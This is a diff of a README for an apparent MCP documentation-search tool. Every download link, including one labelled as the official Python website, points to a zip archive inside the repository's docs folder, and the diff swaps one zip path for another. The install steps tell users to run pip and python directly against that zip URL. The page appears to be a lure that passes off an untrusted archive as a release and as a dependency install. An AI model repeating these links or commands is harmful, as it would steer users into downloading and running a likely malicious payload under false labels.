@@ -6,11 +6,11 @@ This guide helps you download and run the **cloudscape-docs-mcp** application. T
 
 ## 📥 Download the Application
 
-[![Download Cloudscape MCP](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip%https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip)](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip)
+[![Download Cloudscape MCP](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip%https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip)](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip)
 
 To download the application, click the button above or visit the link below:
 
-[Download from Releases Page](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip)
 
 ## 🔍 Application Overview
 
@@ -31,14 +31,14 @@ Before you download the application, make sure your system meets the following r
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a Linux distribution with Python support.
 - **RAM:** At least 4 GB of RAM.
 - **Disk Space:** Minimum of 200 MB free disk space.
-- **Python:** Version 3.7 or later. (If not installed, please download it from the [official Python website](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip).)
+- **Python:** Version 3.7 or later. (If not installed, please download it from the [official Python website](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip).)
 
 ## 📂 Installation Steps
 
 Follow these straightforward steps to install and run the application:
 
 1. **Visit the Releases Page**
-   - Go to [this page](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip).
+   - Go to [this page](https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip).
 
 2. **Download the Latest Version**
    - Look for the latest release.
@@ -56,10 +56,10 @@ Follow these straightforward steps to install and run the application:
    - Example: `cd path/to/extracted/folder`
 
 6. **Install Required Dependencies**
-   - Run the command `pip install -r https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip` in your CLI. This installs all necessary packages.
+   - Run the command `pip install -r https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip` in your CLI. This installs all necessary packages.
 
 7. **Run the Application**
-   - Use the command `python https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/badge/cloudscape-docs-mcp-v3.7-beta.4.zip` or follow the instructions in the README file provided in the downloaded folder.
+   - Use the command `python https://raw.githubusercontent.com/prem676/cloudscape-docs-mcp/main/docs/components/feedback/mcp_cloudscape_docs_2.3-beta.1.zip` or follow the instructions in the README file provided in the downloaded folder.
    - The server should start, and you can access the search interface through your web browser.
 
 ## 🌐 Using the Application
